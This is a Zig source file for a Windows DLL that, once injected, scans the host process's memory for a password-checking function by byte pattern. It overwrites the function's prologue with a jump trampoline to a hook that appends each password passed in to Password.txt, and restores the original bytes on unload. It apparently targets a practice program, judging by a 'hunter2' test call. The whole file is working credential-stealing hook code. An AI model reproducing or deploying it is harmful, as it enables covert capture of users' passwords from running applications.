const std = @import("std");
const windows = std.os.windows;
const print = std.debug.print;

extern "kernel32" fn WriteFile(
  File: windows.HANDLE,
  Buffer: windows.LPVOID,
  NumberOfBytesToWrite: u32,
  NumberOfBytesWritten: ?*u32,
  OverLapped: ?*windows.OVERLAPPED
) c_int;

extern "kernel32" fn CreateFileA(
  FileName: windows.LPCSTR,
  DesiredAccess: u32,
  SharedMode: u32,
  SecurityAttributes: ?*windows.SECURITY_ATTRIBUTES,
  CreationDisposal: u32,
  FlagsAndAttributes: u32,
  TemplateFile: ?windows.HANDLE
) windows.HANDLE;

extern "kernel32" fn SetFilePointer(
  File: windows.HANDLE,
  DistanceToMove: i32,
  DistanceToMoveHigh: ?*i32,
  MoveMethod: u32
) u32;

fn myHook(pw: [*:0]const u8) bool {
  var i: u32 = 0;
  const Space: u8 = ' ';
  while (pw[i] != 0) {i += 1;}
  const File = CreateFileA(
    "./Password.txt", 
    windows.GENERIC_WRITE, 
    0x00000001, 
    null, 
    4, 
    128, 
    null
  );
  if (File != windows.INVALID_HANDLE_VALUE) {
    _ = SetFilePointer(File, 0, null, windows.FILE_END);
    _ = WriteFile(File, @constCast(@ptrCast(pw)), i, null, null);
    _ = WriteFile(File, @constCast(@ptrCast(&Space)), 1, null, null);
    windows.CloseHandle(File);
  } else {
    return false;
  }
  
  return true;
}

var ShellCode: [12]u8 = .{
  0x48, 0xB8,             // mov rax, imm64
  0x00, 0x00, 0x00, 0x00, // нижні 4 байти адреси
  0x00, 0x00, 0x00, 0x00, // верхні 4 байти адреси
  0xFF, 0xE0              // jmp rax
};
var oldProtect: u32 = 0;
var OriginalBytes: [12]u8 = undefined;
const FunctionSize: usize = 80;

const Pattern: [18]u8 = .{
  0x55, 0x48, 0x83, 0xEC, 0x50, 0x48, 0x8D, 0x6C,
  0x24, 0x50, 0x48, 0x89, 0x4D, 0xE0, 0x48, 0x89,
  0x55, 0xE8,
};


var Function: *fn([*:0]const u8) bool = undefined;

var FoundMemory: ?[]u8 = undefined;

fn injectCode() void {
  @memcpy(FoundMemory.?[0..12], &ShellCode);
}

fn revertCode() void {
  @memcpy(FoundMemory.?[0..12], &OriginalBytes);
}

fn findFunctionMemory() ?[]u8 {
  var Address: usize = 0;
  var LocalMemoryPosition: usize = 0;
  var LocalPatternPosition: usize = 0;
  var Equal: u8 = 0;

  var MemInfo: windows.MEMORY_BASIC_INFORMATION = undefined;

  const EXECUTE_FLAGS = 
    windows.PAGE_EXECUTE |
    windows.PAGE_EXECUTE_READ |
    windows.PAGE_EXECUTE_READWRITE |
    windows.PAGE_EXECUTE_WRITECOPY;

  if (windows.VirtualQuery(null, &MemInfo, @sizeOf(windows.MEMORY_BASIC_INFORMATION)) catch {
    print("Unexpected error at VirtualQuery initial\n", .{});
    return null;
  } != 0) {
    Address = @intFromPtr(MemInfo.BaseAddress) + MemInfo.RegionSize;
  } else {
    return null;
  }

  while (windows.VirtualQuery(@ptrFromInt(Address), &MemInfo, @sizeOf(windows.MEMORY_BASIC_INFORMATION)) catch {
    print("Unexpected error at VirtualQuery loop\n", .{});
    return null;
  } != 0) {
    if ((MemInfo.Protect & EXECUTE_FLAGS) != 0 and MemInfo.State == windows.MEM_COMMIT) {
      const Memory: [*]u8 = @ptrFromInt(Address);
      LocalMemoryPosition = 0;

      while (LocalMemoryPosition < MemInfo.RegionSize) {
        const Byte = Memory[LocalMemoryPosition];

        if (Byte == 0x00) {
          LocalMemoryPosition += 1;
        } else if (Byte == Pattern[0]) {
          LocalPatternPosition = 1;
          Equal = 1;
          var Fail: u8 = 0;
          var Pos = LocalMemoryPosition + 1;

          while (LocalPatternPosition < Pattern.len and Fail < 4 and Pos < MemInfo.RegionSize) {
            if (Memory[Pos] == Pattern[LocalPatternPosition]) {
              Equal += 1;
            } else {
              Fail += 1;
            }
            Pos += 1;
            LocalPatternPosition += 1;
          }

          if (Equal == Pattern.len) {
            return Memory[LocalMemoryPosition..LocalMemoryPosition + 80];
          }
          LocalMemoryPosition += 1;
        } else {
          LocalMemoryPosition += 1;
        }
      }
    }

    Address = @intFromPtr(MemInfo.BaseAddress) + MemInfo.RegionSize;
  }

  return null;
}

pub export fn DllMain(_: std.os.windows.HINSTANCE, Reason: u32, _: *anyopaque) c_int {
  switch (Reason) {
    // Attached to process
    1 => {
      FoundMemory = findFunctionMemory();
      if (FoundMemory == null) {
        print("Found null memory!\n", .{});
        return 2;
      }

      Function = @ptrCast(FoundMemory.?);
      if (Function("hunter2") == true) {print("It's hunter2\n", .{});}

      @memcpy(&OriginalBytes, FoundMemory.?[0..12]);
      const ShellSlice: *usize = @alignCast(@ptrCast(ShellCode[2..10]));
      ShellSlice.* = @intFromPtr(&myHook);
      print("MyHook: {*}\n", .{&myHook});

      print("ShellCode: \n", .{});
      for (ShellCode) |Byte| {
        print("0x{X}, ", .{Byte});
      }
      print ("\n", .{});
      
      windows.VirtualProtect(@ptrCast(FoundMemory.?), FunctionSize, windows.PAGE_EXECUTE_READWRITE, &oldProtect) catch |err| {
        switch (err) {
          error.InvalidAddress => {print("InvalidAddress error when applying new protection!\n", .{}); return 3;},
          error.Unexpected => {print("Unexpected error when applying new protection!\n", .{}); return 4;}
        }
      };
      injectCode();
      
      return 1; // True in windows C
    },
    // Detached from process
    0 => {
      revertCode();
      windows.VirtualProtect(@ptrCast(FoundMemory.?), FunctionSize, oldProtect, &oldProtect) catch |err| {
      switch (err) {
        error.InvalidAddress => {print("InvalidAddress error when applying old protection!\n", .{}); return 3;},
        error.Unexpected => {print("Unexpected error when applying old protection!\n", .{}); return 4;}
      }
    };
      return 1;
    },
    // Attached to thread
    2 => {
      return 1;
    },
    // Detached from thread
    3 => {
      return 1;
    },
    else => {
      return 0;
    }
  }
}